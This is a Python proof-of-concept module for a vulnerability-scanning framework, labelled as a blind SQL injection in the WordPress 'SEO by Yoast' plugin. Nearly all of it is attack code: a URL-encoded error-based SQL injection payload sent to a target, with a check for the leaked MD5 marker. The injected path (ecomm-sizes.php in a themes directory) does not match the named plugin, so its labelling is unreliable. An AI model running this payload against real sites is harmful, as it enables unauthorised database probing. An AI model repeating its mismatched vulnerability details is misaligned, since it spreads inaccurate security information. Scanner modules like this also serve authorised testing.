# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0070' # 平台漏洞编号，留空
    name = 'WordPress Plugin SEO by Yoast 1.7.3.3 - Blind SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-09-07'  # 漏洞公布时间
    desc = '''
        WordPress Plugin SEO by Yoast 1.7.3.3 - Blind SQL Injection
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36413/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin SEO by Yoast <= 1.7.3.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4d429647-03b5-4808-841c-12ab14ccf214'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/wp-content/themes/ecomm-sizes.php?prod_id=%20and(select%201%20from(select%20count(*),concat((select%20(select%20md5(12345))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23'
            verify_url = arg + payload 
            code, head,res, errcode, _ = hh.http(verify_url)
                       
            if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()